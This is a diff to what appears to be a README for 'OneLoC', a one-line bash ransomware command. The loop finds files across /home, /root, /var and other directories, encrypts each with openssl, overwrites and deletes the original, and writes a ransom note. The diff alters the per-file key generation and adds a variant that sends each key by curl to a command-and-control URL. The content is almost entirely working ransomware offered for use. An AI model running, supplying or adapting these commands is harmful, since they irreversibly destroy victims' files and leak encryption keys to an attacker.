@@ -13,5 +13,12 @@ With great powers, great responsibilities...
 #### One LoC: One Line Of Code
 
 ```
-Ransom@lock:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do openssl enc -aes-256-cbc -a -salt -in $i -out $i.LoC -k $(echo -n $RANDOM | base64 | sha256sum) && echo "OneLoC Anti-Forensic..." > $i && rm -rf $i;echo 'All your files has been encrypted by: OneLoC !' > $HOME/README.TXT;done >/dev/null 2>&1& 
+Ransom@lock:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do rdc=$(mktemp -u|rev|cut -d"." -f1) && CODE=$rdc$RANDOM && openssl enc -aes-256-cbc -a -salt -in $i -out $i.LoC -k $(echo -n $CODE | base64 | sha256sum) && echo "OneLoC Anti-Forensic..." > $i && rm -rf $i;echo 'All your files has been encrypted by: OneLoC !' > $HOME/README.TXT;done >/dev/null 2>&1&
 ```
+
+#### With Exfiltration:  
+```
+Ransom@lock:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do rdc=$(mktemp -u|rev|cut -d"." -f1) && CODE=$rdc$RANDOM && curl -s -X GET https://c2.att.ck/exfilt.php?key=$CODE -k && openssl enc -aes-256-cbc -a -salt -in $i -out $i.LoC -k $(echo -n $CODE | base64 | sha256sum) && echo "OneLoC Anti-Forensic..." > $i && rm -rf $i;echo 'All your files has been encrypted by: OneLoC !' > $HOME/README.TXT;done >/dev/null 2>&1&
+```  
+
+
